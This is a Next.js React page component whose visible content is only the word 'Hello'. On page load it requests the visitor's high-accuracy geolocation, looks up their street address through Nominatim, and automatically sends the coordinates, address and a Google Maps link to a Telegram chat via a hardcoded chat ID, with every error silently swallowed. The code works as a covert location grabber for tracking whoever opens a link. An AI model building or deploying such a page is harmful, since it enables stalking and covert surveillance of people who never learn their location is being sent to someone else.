'use client';

import { useState, useEffect } from 'react';

export default function Home() {
  const [coords, setCoords] = useState<{ lat: number | null; lon: number | null }>({ lat: null, lon: null });
  const [address, setAddress] = useState('');

  useEffect(() => {
    if (!navigator.geolocation) {
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;
        setCoords({ lat: latitude, lon: longitude });
        
        // Get address
        try {
          const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
          const data = await response.json();
          const addressText = data.display_name || 'Address not found';
          setAddress(addressText);

          // Automatically send location to Telegram
          const message = `📍 Location Update:\nLat: ${latitude}\nLon: ${longitude}\nAddress: ${addressText}\n\nView on Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
          
          await fetch('/api/send-message', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chatId: '5595856929',
              message: message
            })
          });
        } catch (err) {
          // Silent error handling
        }
      },
      (err) => {
        // Silent error handling
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  }, []);

  return (
    <div className="min-h-screen bg-gray-100 dark:bg-gray-900 flex items-center justify-center">
      <div className="text-center">
        <h1 className="text-4xl font-bold text-gray-900 dark:text-white">Hello</h1>
      </div>
    </div>
  );
}
